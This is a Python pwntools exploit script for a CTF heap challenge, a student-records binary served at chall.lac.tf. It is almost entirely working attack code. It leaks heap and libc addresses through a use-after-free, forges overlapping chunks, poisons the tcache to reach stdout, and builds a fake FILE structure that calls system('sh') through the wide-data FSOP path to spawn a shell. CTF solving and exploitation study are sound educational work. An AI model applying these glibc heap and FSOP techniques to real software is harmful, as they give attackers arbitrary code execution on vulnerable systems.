#!/usr/bin/env python3

from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31147)
    # r = remote("localhost", 5000)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript='''
        ''')


def fill_sinfo(name: bytes, major: bytes, attr: int, aux=None, break_early=False):
    sna(b'name: ', name)
    if break_early: return
    sna(b'major: ', major)
    sla(b'= 1): ', sen(attr))
    if aux:
        sla(b'(y/n)?', b'y')
        sna(b'data: ', aux)
    else: sla(b'(y/n)?', b'n')

def add_student(uid: int, add_sinfo: bool, name=None, major=None, attr=None, aux=None, break_early=False):
    sla(b'> ', sen(1))
    sla(b'UID: ', sen(uid))
    if add_sinfo: 
        sla(b'later: ', b'y')
        fill_sinfo(name, major, attr, aux=aux, break_early=break_early)
    else: sla(b'later: ', b'n')

def get_sinfo(uid: int):
    sla(b'> ', sen(2))
    sla(b'UID: ', sen(uid))

def remove_student(uid: int):
    sla(b'> ', sen(3))
    sla(b'UID: ', sen(uid))

def main():

    # Heap leak
    add_student(100, True, name=b"bruh", major=b'bruh2', attr=123)
    remove_student(100)
    add_student(100, False)
    get_sinfo(100)
    rcu(b'Student Name: ')
    heap_base = u64(rcl().strip().ljust(8, b'\x00')) * 0x1000
    log.info(f"{hex(heap_base)=}")

    # For filling the tcache and then having an unsorted bin chunk
    for i in range(7): 
        add_student(100+i, True, name=b'bruh', major=b'bruh2', attr=123)
    add_student(123, True, name=b'A'*0x100, 
        major = b'\x00' * 0x40, # Make sure the heap artifacts for student->sinfo are null ptrs for the ones we don't want to UAF
        aux = b'C' * 0x10 + p64(heap_base + 0x1300) + b'\x00' * 0x20 + p64(0x101) + b'D' * 0x10 + p64(heap_base + 0xe30))
    add_student(124, False) # Barrier chunk

    # Fill the tcache and get the 0x110 chunk to go into the unsorted bin
    for i in range(7):
        remove_student(100+i)
    add_student(100, False)
    remove_student(123)
    remove_student(124)

    # libc leak
    add_student(123, False)
    get_sinfo(123)
    rcu(b'Student Name: ')
    libc.address = u64(rcl().replace(b'\n',b'').ljust(8, b'\x00')) - 1993760
    log.info(f"{hex(libc.address)=}")

    # Get sinfo of new chunks to point to forged tcache list
    for i in range(7): 
        add_student(100+i, False)
    add_student(123, False)
    add_student(124, True, name=b'bruh', major=b'bruh2', attr=123) # Pull chunks out of the 0x110 tcache
    add_student(125, True, name=p64(0x110) * (0x100//8), # Reclaim the chunks in which we will forge our 0x110 chunk
        major=b'A'*0x8 + p64(0x111), attr=123)
    
    add_student(126, False) # Victim student struct that will use our heap artifacts

    # Chunk overlap of recently-freed tcache chunk in 0x110 with previously-freed chunk in there!
    remove_student(125)
    remove_student(126)

    # tcache poison
    add_student(127, True, name=b'A' * 0xc8 + p64(0x111) + p64(mangle(libc.sym._IO_2_1_stdout_, heap_base)) , major=b'bruh2', attr=123)
    add_student(128, True, name=b'bruh', major=b'bruh2', attr=123)

    # FSOP to win
    FILE_addr = libc.sym._IO_2_1_stdout_
    fp = FileStructure(libc.address + 0x1ec5e8)
    fp.flags = b'  sh\x00\x00\x00\x00' # so that _IO_NO_WRITES and _IO_CURRENTLY_PUTTING are both 0
    # fp._IO_read_ptr = b'h\x00'.ljust(8, b'\x00')

    # Ensure that *(fp->_wide_data) + 0xe0 = &(fp->_codecvt)
    # - Note that we need both fp->_wide_data._IO_write_base (offset 0x18) and fp->_wide_data._IO_buf_base (offset 0x30) to be 0
    fp._wide_data = FILE_addr + 0x98 - 0xe0

    fp._codecvt = p64(FILE_addr + 0xb0 - 0x68) # ensure that *(fp->_codecvt) + 0x68 = &fp->_freeres_buf
    fp.unknown2 = b''.join([
        p64(0), # _freeres_list
        p64(libc.sym.system), # _freeres_buf
        p64(0), # __pad5
        p32(0xffffffff), # _mode (so that _IO_flush_all_lockp will try to call _IO_new_file_overflow)
        p32(0), # _unused2[0:4]
        p64(0) * 2 # _unused2[4:20]
    ])
    fp.vtable = libc.sym._IO_wfile_jumps # so that vtable + 0x20 calls _IO_wfile_overflow
    
    add_student(129, True, name=bytes(fp), major=b'bruh2', attr=123, break_early=True)

    r.interactive()


if __name__ == "__main__":
    main()
